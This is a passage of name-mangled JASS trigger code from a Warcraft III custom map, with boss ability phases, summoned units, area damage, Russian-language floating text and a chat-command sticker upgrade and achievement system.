call TriggerAddCondition(eF,Condition(function BsN))
call TriggerAddAction(eF,function BsO)
endfunction
function BsQ takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
return false
endfunction
function BsR takes nothing returns boolean
if not BsQ() then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[11])) then
return false
endif
return true
endfunction
function BsS takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagLocBJ("Темная Тварь
",GetUnitLoc(GetTriggerUnit()),0,15.,0.,0.,0.,30.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[11]))
set TS[11]=TS[11]-10
set Vz=GetRectCenter(D6)
set Wi[36]=CreateUnitAtLoc(Player(10),$68303630,Vz,GetRandomReal(0,360.))
call UnitApplyTimedLifeBJ(3.5,$42544C46,Wi[36])
call IssuePointOrderLoc(Wi[36],"carrionswarm",Vz)
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BsT takes nothing returns nothing
set go=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(go,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(go,Condition(function BsR))
call TriggerAddAction(go,function BsS)
endfunction
function BsU takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364D then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364C then
return true
endif
return false
endfunction
function BsV takes nothing returns boolean
if not BsU() then
return false
endif
return true
endfunction
function BsW takes nothing returns nothing
call ShowUnit(Ly,true)
call SetUnitOwner(Ly,Player(11),true)
call SetUnitInvulnerable(Ly,false)
call SetUnitPositionLocFacingBJ(Ly,GetRectCenter(F0),270.)
endfunction
function BsX takes nothing returns nothing
set gp=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gp,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(gp,Condition(function BsV))
call TriggerAddAction(gp,function BsW)
endfunction
function BsY takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303631) then
return false
endif
return true
endfunction
function BsZ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bsa takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-15000.)
endfunction
function Bsb takes nothing returns nothing
set Vz=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(400.,Vz,Condition(function BsZ))
call ForGroupBJ(SR,function Bsa)
call DestroyGroup(SR)
call RemoveLocation(Vz)
endfunction
function Bsc takes nothing returns nothing
set gq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gq,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(gq,Condition(function BsY))
call TriggerAddAction(gq,function Bsb)
endfunction
function Bsd takes nothing returns nothing
local unit VB=GetTriggerUnit()
local location Mc
local unit No
if GetUnitLifePercent(VB)<=I2R(UL[2]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(VB,I2R(UL[2]))
set UL[2]=UL[2]-20
call nh(VB,"Цунами!",.035,0,255,255)
set Mc=Location(18600,-23200)
set No=CreateUnit(Player(10),$68303451,GetLocationX(Mc),GetLocationY(Mc),270.)
call UnitApplyTimedLife(No,$42544C46,15.)
if d8[8]==2 then
call SetUnitAbilityLevel(No,$4130355A,2)
endif
call IssuePointOrder(No,"stampede",GetLocationX(Mc),GetLocationY(Mc))
call RemoveLocation(Mc)
set Mc=null
set No=null
call EnableTrigger(GetTriggeringTrigger())
endif
set VB=null
endfunction
function Bse takes nothing returns nothing
local unit VB=GetTriggerUnit()
local unit Hu
local location Ht
local location Nk
local integer Pd
local group V9
local boolexpr Nb
local integer Mc
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(27)
call nh(VB,"Ууууух, повеселимся",.035,100,255,255)
call PauseUnit(VB,true)
call TriggerSleepAction(1.5)
set Ht=GetUnitLoc(VB)
set Pd=50
loop
set Nk=nU(Ht,Pd,GetUnitFacing(VB))
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl",Nk))
set V9=CreateGroup()
set Nb=Condition(function mv)
call GroupEnumUnitsInRange(V9,GetLocationX(Nk),GetLocationY(Nk),80,Nb)
call DestroyBoolExpr(Nb)
set Pq=VB
set Nu=45000
call ForGroup(V9,function nB)
call DestroyGroup(V9)
set Nb=null
set V9=null
call RemoveLocation(Nk)
set Nk=null
set Pd=Pd+50
exitwhen Pd>=1000
endloop
call RemoveLocation(Ht)
set Ht=null
call PauseUnit(VB,false)
set Hu=CreateUnit(Player(10),$6E736E70,GetRandomReal(17980,19100),GetRandomReal(-24280,-22000),270.)
call nh(Hu,"Я тут!",.035,100,255,255)
call PauseUnit(Hu,true)
call UnitApplyTimedLife(Hu,$42544C46,50.)
call UnitAddAbility(Hu,$41303541)
call SetUnitVertexColor(Hu,GetRandomInt(0,255),GetRandomInt(0,255),GetRandomInt(0,255),255)
call TriggerSleepAction(1.5)
set Ht=GetUnitLoc(Hu)
set Pd=50
loop
set Nk=nU(Ht,Pd,GetUnitFacing(Hu))
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl",Nk))
set V9=CreateGroup()
set Nb=Condition(function mv)
call GroupEnumUnitsInRange(V9,GetLocationX(Nk),GetLocationY(Nk),80,Nb)
call DestroyBoolExpr(Nb)
set Pq=VB
set Nu=45000
call ForGroup(V9,function nB)
call DestroyGroup(V9)
set Nb=null
set V9=null
call RemoveLocation(Nk)
set Nk=null
set Pd=Pd+50
exitwhen Pd>=1000
endloop
call RemoveLocation(Ht)
set Ht=null
call PauseUnit(Hu,false)
if d8[8]==2 then
set Mc=1
loop
set Hu=CreateUnit(Player(10),$6E736E70,GetRandomReal(17980,19100),GetRandomReal(-24280,-22000),270.)
call UnitAddAbility(Hu,$41637269)
call UnitAddAbility(Hu,$41304451)
call UnitAddAbility(Hu,$4131394B)
call UnitAddAbility(Hu,$41303541)
call SetUnitAbilityLevel(Hu,$4131394B,4)
call UnitApplyTimedLife(Hu,$42544C46,100.)
call SetUnitVertexColor(Hu,GetRandomInt(0,255),GetRandomInt(0,255),GetRandomInt(0,255),255)
set Mc=Mc+1
exitwhen Mc>3
endloop
endif
call EnableTrigger(GetTriggeringTrigger())
set VB=null
set Hu=null
endfunction
function Bsf takes nothing returns nothing
local unit VB=GetTriggerUnit()
local unit Hu
local location Ht
local integer Pd=50
local location Nk
local group Mc
local boolexpr No
call DisableTrigger(GetTriggeringTrigger())
if d8[8]==2 then
call TriggerSleepAction(15)
else
call TriggerSleepAction(25)
endif
set Hu=CreateUnit(Player(10),$6E736E70,GetRandomReal(18140,18950),-22050,270.)
call PauseUnit(Hu,true)
call SetUnitVertexColor(Hu,0,0,0,120)
call nD(Hu,4)
call TriggerSleepAction(2)
set Ht=GetUnitLoc(Hu)
loop
set Nk=nU(Ht,Pd,GetUnitFacing(Hu))
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl",Nk))
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(Nk),GetLocationY(Nk),80,No)
call DestroyBoolExpr(No)
set Pq=VB
set Nu=95000
call ForGroup(Mc,function nB)
call DestroyGroup(Mc)
set No=null
set Mc=null
call RemoveLocation(Nk)
set Nk=null
set Pd=Pd+50
exitwhen Pd>=2300
endloop
call RemoveLocation(Ht)
set Ht=null
call EnableTrigger(GetTriggeringTrigger())
set VB=null
set Hu=null
endfunction
function Bsg takes nothing returns nothing
local trigger gr=CreateTrigger()
call TriggerRegisterUnitEvent(gr,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gr,function Bse)
set gr=null
set gr=CreateTrigger()
call TriggerRegisterUnitEvent(gr,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gr,function Bsd)
set gr=null
set gr=CreateTrigger()
call TriggerRegisterUnitEvent(gr,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gr,function Bsf)
set gr=null
endfunction
function Bsh takes nothing returns nothing
local unit VB=LoadUnitHandle(gt,GetHandleId(GetExpiredTimer()),0)
local unit Hu=LoadUnitHandle(gt,GetHandleId(GetExpiredTimer()),1)
local location fk=GetUnitLoc(VB)
local location Nk=GetUnitLoc(Hu)
call IssuePointOrderLoc(Hu,"smart",fk)
call SaveInteger(gt,GetHandleId(GetExpiredTimer()),2,LoadInteger(gt,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(gt,GetHandleId(GetExpiredTimer()),2)==0 then
if GetUnitState(Hu,UNIT_STATE_LIFE)>0 then
call SetUnitLifePercentBJ(VB,100)
set UL[0]=98
set UL[1]=75
set UL[2]=80
set UL[3]=75
set UL[4]=90
set UL[5]=97
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call KillUnit(Hu)
call RemoveUnit(Hu)
endif
endif
if GetUnitState(Hu,UNIT_STATE_LIFE)>0 then
if DistanceBetweenPoints(fk,Nk)<=200 then
call SetUnitLifePercentBJ(VB,100)
set UL[0]=98
set UL[1]=75
set UL[2]=80
set UL[3]=75
set UL[4]=90
set UL[5]=97
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call KillUnit(Hu)
call RemoveUnit(Hu)
endif
else
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveUnit(Hu)
endif
call RemoveLocation(Nk)
call RemoveLocation(fk)
set fk=null
set Nk=null
set Hu=null
set VB=null
endfunction
function Bsi takes nothing returns nothing
local unit VB=GetTriggerUnit()
local unit Mc
local unit No
local unit Np
local unit Nt
local unit Ny
local timer Ot
if GetUnitLifePercent(VB)<=I2R(UL[3]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(VB,I2R(UL[3]))
set UL[3]=UL[3]-25
call nh(VB,"Братишка",.035,100,255,255)
set Mc=CreateUnit(Player(10),$6E303845,18556,-24200,90.)
set No=CreateUnit(Player(10),$6E303846,18000,-22600,90.)
set Np=CreateUnit(Player(10),$6E303846,19090,-22600,90.)
set Nt=CreateUnit(Player(10),$6E303846,18000,-23900,90.)
set Ny=CreateUnit(Player(10),$6E303846,19090,-23900,90.)
call UnitApplyTimedLife(No,$42544C46,60.)
call UnitApplyTimedLife(Np,$42544C46,60.)
call UnitApplyTimedLife(Nt,$42544C46,60.)
call UnitApplyTimedLife(Ny,$42544C46,60.)
set Ot=CreateTimer()
call SaveUnitHandle(gt,GetHandleId(Ot),0,VB)
call SaveUnitHandle(gt,GetHandleId(Ot),1,Mc)
call SaveInteger(gt,GetHandleId(Ot),2,36)
set gu[1]=4
call TimerStart(Ot,.5,true,function Bsh)
call EnableTrigger(GetTriggeringTrigger())
set Mc=null
set No=null
set Np=null
set Nt=null
set Ny=null
set Ot=null
endif
set VB=null
endfunction
function Bsj takes nothing returns nothing
set gs=CreateTrigger()
call TriggerRegisterUnitEvent(gs,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gs,function Bsi)
endfunction
function Bsk takes nothing returns nothing
local unit X1=GetEnumUnit()
call KillUnit(X1)
set X1=null
endfunction
function Bsl takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())==$6E303845 then
return true
endif
return false
endfunction
function Bsm takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local group Mc
local boolexpr No
if GetUnitTypeId(Hu)==$6E303846 then
call RemoveUnit(Hu)
set gu[1]=gu[1]-1
if gu[1]==0 then
set Mc=CreateGroup()
set No=Condition(function Bsl)
call GroupEnumUnitsInRect(Mc,GJ,No)
call DestroyBoolExpr(No)
call ForGroup(Mc,function Bsk)
call DestroyGroup(Mc)
set No=null
set Mc=null
endif
endif
set Hu=null
endfunction
function Bsn takes nothing returns nothing
set gv=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gv,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(gv,function Bsm)
endfunction
function Bso takes nothing returns nothing
local unit gx=LoadUnitHandle(gt,GetHandleId(GetExpiredTimer()),0)
local unit Nv=LoadUnitHandle(gt,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(gx)
local location Nk=GetUnitLoc(Nv)
local location dR=Location(18555,-23650)
local location gy=Location(18555,-22800)
call IssuePointOrderLoc(Nv,"smart",Ht)
call SaveInteger(gt,GetHandleId(GetExpiredTimer()),2,LoadInteger(gt,GetHandleId(GetExpiredTimer()),2)-1)
if DistanceBetweenPoints(Ht,Nk)<=150 or LoadInteger(gt,GetHandleId(GetExpiredTimer()),2)==0 then
call DestroyEffect(LoadEffectHandle(gt,GetHandleId(GetExpiredTimer()),3))
call KillUnit(gx)
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Human\\HCancelDeath\\HCancelDeath.mdl",Nk))
call KillUnit(Nv)
call RemoveUnit(Nv)
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(gt,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
else
if DistanceBetweenPoints(dR,Nk)<=100 or DistanceBetweenPoints(gy,Nk)<=100 then
call DestroyEffect(LoadEffectHandle(gt,GetHandleId(GetExpiredTimer()),3))
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Human\\HCancelDeath\\HCancelDeath.mdl",Nk))
call KillUnit(Nv)
call RemoveUnit(Nv)
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(gt,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
call RemoveLocation(dR)
call RemoveLocation(gy)
set gx=null
set Nv=null
set Nk=null
set Ht=null
set dR=null
set gy=null
endfunction
function Bsp takes nothing returns nothing
local unit VB=GetTriggerUnit()
local group Mc
local boolexpr No
local unit Np
local location Nt
local integer Ny
local unit Ot
local timer Ou
local effect Ov
if GetUnitLifePercent(VB)<=I2R(UL[4]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(VB,I2R(UL[4]))
set UL[4]=UL[4]-10
call nh(VB,"На абордаж!",.035,255,100,100)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,GJ,No)
set Np=GroupPickRandomUnit(Mc)
set Ny=GetRandomInt(1,4)
if Ny==1 then
set Nt=Location(18130,-22130)
elseif Ny==2 then
set Nt=Location(18912,-22130)
elseif Ny==3 then
set Nt=Location(18130,-24070)
elseif Ny==4 then
set Nt=Location(18912,-24070)
endif
set Ot=CreateUnit(Player(10),$686D746D,GetLocationX(Nt),GetLocationY(Nt),90.)
set Ou=CreateTimer()
set Ov=AddSpecialEffectTarget("war3mapImported\\ScannerSweep.mdl",Np,"origin")
call SaveUnitHandle(gt,GetHandleId(Ou),0,Np)
call SaveUnitHandle(gt,GetHandleId(Ou),1,Ot)
call SaveEffectHandle(gt,GetHandleId(Ou),3,Ov)
call SaveInteger(gt,GetHandleId(Ou),2,90)
call TimerStart(Ou,.1,true,function Bso)
call DestroyGroup(Mc)
call EnableTrigger(GetTriggeringTrigger())
call DestroyBoolExpr(No)
set Mc=null
set No=null
set Np=null
set Ot=null
set Ou=null
set Ov=null
endif
set VB=null
set Nt=null
endfunction
function Bsq takes nothing returns nothing
set gw=CreateTrigger()
call TriggerRegisterUnitEvent(gw,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gw,function Bsp)
endfunction
function Bsr takes nothing returns nothing
local unit X1=GetEnumUnit()
if d8[8]==1 then
call SetUnitLifeBJ(X1,GetUnitStateSwap(UNIT_STATE_LIFE,X1)-7000)
elseif d8[8]==2 then
call SetUnitLifeBJ(X1,GetUnitStateSwap(UNIT_STATE_LIFE,X1)-15000)
endif
set X1=null
endfunction
function Bss takes nothing returns nothing
local unit Hu=LoadUnitHandle(gt,GetHandleId(GetExpiredTimer()),1)
local real MD=GetUnitX(Hu)
local real ME=GetUnitY(Hu)
local real NT=300.
local group V9=CreateGroup()
local boolexpr df=Condition(function mv)
call GroupEnumUnitsInRange(V9,MD,ME,NT,df)
call DestroyBoolExpr(df)
call ForGroup(V9,function Bsr)
call DestroyGroup(V9)
set df=null
set V9=null
call DestroyEffect(AddSpecialEffectLoc("Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl",Location(MD,ME)))
call SaveInteger(gt,GetHandleId(GetExpiredTimer()),2,LoadInteger(gt,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(gt,GetHandleId(GetExpiredTimer()),2)==0 then
call KillUnit(Hu)
call RemoveUnit(Hu)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function Bst takes nothing returns nothing
local unit VB=GetTriggerUnit()
local unit Mc
local timer No
if GetUnitLifePercent(VB)<=I2R(UL[5]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(VB,I2R(UL[5]))
set UL[5]=UL[5]-1
call nh(VB,"Хлюп",.035,255,100,0)
set Mc=CreateUnit(Player(10),$6E303846,GetRandomReal(17980,19100),GetRandomReal(-24280,-22000),90.)
call UnitAddAbility(Mc,$416C6F63)
call SetUnitVertexColor(Mc,10,10,255,150)
set No=CreateTimer()
call SaveUnitHandle(gt,GetHandleId(No),1,Mc)
call SaveInteger(gt,GetHandleId(No),2,5)
call TimerStart(No,1.,true,function Bss)
call EnableTrigger(GetTriggeringTrigger())
set Mc=null
endif
set VB=null
set No=null
endfunction
function Bsu takes nothing returns nothing
set gz=CreateTrigger()
call TriggerRegisterUnitEvent(gz,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gz,function Bst)
endfunction
function Bsv takes nothing returns nothing
local location Ht=LoadLocationHandle(gt,GetHandleId(GetExpiredTimer()),4)
local group V9
local boolexpr Nb
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Undead\\AnimateDead\\AnimateDeadTarget.mdl",Ht))
set V9=CreateGroup()
set Nb=Condition(function mv)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),200,Nb)
set Pq=Kw
set Nu=80000
call ForGroup(V9,function m9)
call DestroyGroup(V9)
call DestroyBoolExpr(Nb)
call RemoveLocation(Ht)
set Ht=null
set V9=null
set Nb=null
call RemoveSavedHandle(gt,GetHandleId(GetExpiredTimer()),4)
endfunction
function Bsw takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local timer Hc
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",Ht))
set Hc=CreateTimer()
call SaveLocationHandle(gt,GetHandleId(Hc),4,Ht)
call TimerStart(Hc,1,false,function Bsv)
set Hu=null
set Hc=null
set Ht=null
endfunction
function Bsx takes nothing returns nothing
local group V9=LoadGroupHandle(g1,GetHandleId(GetExpiredTimer()),5)
call ForGroup(V9,function Bsw)
call SaveInteger(g1,GetHandleId(GetExpiredTimer()),2,LoadInteger(g1,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(g1,GetHandleId(GetExpiredTimer()),2)==0 then
call DestroyGroup(V9)
set V9=null
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveSavedHandle(g1,GetHandleId(GetExpiredTimer()),5)
call RemoveSavedInteger(g1,GetHandleId(GetExpiredTimer()),2)
endif
set V9=null
endfunction
function Bsy takes nothing returns nothing
local unit VB=GetTriggerUnit()
local group Mc
local boolexpr No
local timer Np
if GetUnitLifePercent(VB)<=I2R(UL[6]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(VB,I2R(UL[6]))
set UL[6]=UL[6]-20
call nh(VB,"Стоите? Ну стойте",.035,255,100,100)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,GJ,No)
set Np=CreateTimer()
call SaveGroupHandle(g1,GetHandleId(Np),5,Mc)
call SaveInteger(g1,GetHandleId(Np),2,5)
call TimerStart(Np,2,true,function Bsx)
set No=null
endif
set Np=null
set Mc=null
set VB=null
endfunction
function Bsz takes nothing returns nothing
set g0=CreateTrigger()
call TriggerRegisterUnitEvent(g0,Kw,EVENT_UNIT_DAMAGED)
call TriggerAddAction(g0,function Bsy)
endfunction
function Bs0 takes nothing returns nothing
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-8)
endfunction
function Bs1 takes nothing returns nothing
local group V9=CreateGroup()
local boolexpr df=Condition(function mv)
call GroupEnumUnitsInRect(V9,GJ,df)
call ForGroup(V9,function Bs0)
call DestroyGroup(V9)
call DestroyBoolExpr(df)
set V9=null
set df=null
endfunction
function Bs2 takes nothing returns nothing
set d9=CreateTrigger()
call DisableTrigger(d9)
call TriggerRegisterTimerEventPeriodic(d9,5.)
call TriggerAddAction(d9,function Bs1)
endfunction
function Bs3 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit NR=GetEnumUnit()
if GetUnitState(NR,UNIT_STATE_LIFE)>.45 then
if GetUnitTypeId(Hu)==$6E303353 and GetUnitAbilityLevel(NR,$41305045)==0 then
call UnitAddAbility(NR,$41305045)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303445 and GetUnitAbilityLevel(NR,$41305045)==1 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$68303045 and GetUnitAbilityLevel(NR,$41305045)==2 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303456 and GetUnitAbilityLevel(NR,$41305045)==3 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6830324F and GetUnitAbilityLevel(NR,$41305045)==4 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$75303054 and GetUnitAbilityLevel(NR,$41305045)==5 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E687963 and GetUnitAbilityLevel(NR,$41305045)==6 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303537 and GetUnitAbilityLevel(NR,$41305045)==7 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303539 and GetUnitAbilityLevel(NR,$41305045)==8 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303654 and GetUnitAbilityLevel(NR,$41305045)==9 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303548 and GetUnitAbilityLevel(NR,$41305045)==10 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303547 and GetUnitAbilityLevel(NR,$41305045)==11 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303630 and GetUnitAbilityLevel(NR,$41305045)==12 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303844 and GetUnitAbilityLevel(NR,$41305045)==13 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
elseif GetUnitTypeId(Hu)==$6E303754 and GetUnitAbilityLevel(NR,$41305045)==14 then
call SetUnitAbilityLevel(NR,$41305045,GetUnitAbilityLevel(NR,$41305045)+1)
call DisplayTimedTextFromPlayer(GetOwningPlayer(NR),0,0,100,"|c00ff00ffВы улучшили наклейку!")
call BJDebugMsg(GetPlayerName(GetOwningPlayer(NR))+" получил достижение |c0000ff00\"Коллекционер\"")
call UnitAddAbility(NR,$41304736)
endif
endif
set Hu=null
set NR=null
endfunction
function Bs4 takes nothing returns nothing
local location Mc
local group No
local boolexpr Np
if GetOwningPlayer(GetTriggerUnit())==Player(11) and GetRandomInt(1,10)==1 then
set Mc=GetUnitLoc(GetTriggerUnit())
set No=CreateGroup()
set Np=Condition(function mv)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),1500,Np)
call ForGroup(No,function Bs3)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
endif
endfunction
function Bs5 takes nothing returns nothing
local integer L9=S2I(SubString(GetEventPlayerChatString(),3,5))
local integer Ma=GetPlayerId(GetTriggerPlayer())
if L9>=1 then
if GetUnitAbilityLevel(MT[Ma],$41305045)>=1 then
call UnitAddAbility(MT[Ma],$41305046)
call SetUnitAbilityLevel(MT[Ma],$41305046,L9)
call DisplayTextToPlayer(Player(Ma),0,0,"|c00ff00ffУстановлена наклейка|r: "+I2S(L9))
else
call DisplayTextToPlayer(Player(Ma),0,0,"|c00ff0000У вас недостаточный уровень наклейки!")
endif
endif
endfunction
function Bs6 takes nothing returns nothing
call DestroyImage(LoadImageHandle(PP,GetHandleId(GetExpiredTimer()),0))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function Bs7 takes nothing returns nothing
local integer Ma=GetPlayerId(GetTriggerPlayer())
local string Mc
local integer No
local timer Np
set ga[Ma]=ga[Ma]+1
if ga[Ma]>=2 and GetUnitAbilityLevel(MT[Ma],$41305046)>=1 then
call DestroyImage(g2[Ma])
set No=1
loop
if GetUnitAbilityLevel(MT[Ma],$41305046)==No then
set Mc="war3mapImported\\N"+I2S(No)+".blp"
endif
set No=No+1
exitwhen No>15
endloop
set g2[Ma]=CreateImage(Mc,200,200,200,GetUnitX(MT[Ma]),GetUnitY(MT[Ma]),0,0,0,0,2)
call SetImageConstantHeight(g2[Ma],true,5)
call SetImageRender(g2[Ma],true)
call SetImageRenderAlways(g2[Ma],true)
call ShowImage(g2[Ma],true)
set Np=CreateTimer()
call SaveImageHandle(PP,GetHandleId(Np),0,g2[Ma])
call TimerStart(Np,5,false,function Bs6)
set Np=null
endif
endfunction
function Bs8 takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Hc,function Bs4)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterPlayerChatEvent(Hc,Player(0),"-n",false)
call TriggerRegisterPlayerChatEvent(Hc,Player(1),"-n",false)
call TriggerRegisterPlayerChatEvent(Hc,Player(2),"-n",false)
call TriggerRegisterPlayerChatEvent(Hc,Player(3),"-n",false)
call TriggerRegisterPlayerChatEvent(Hc,Player(4),"-n",false)
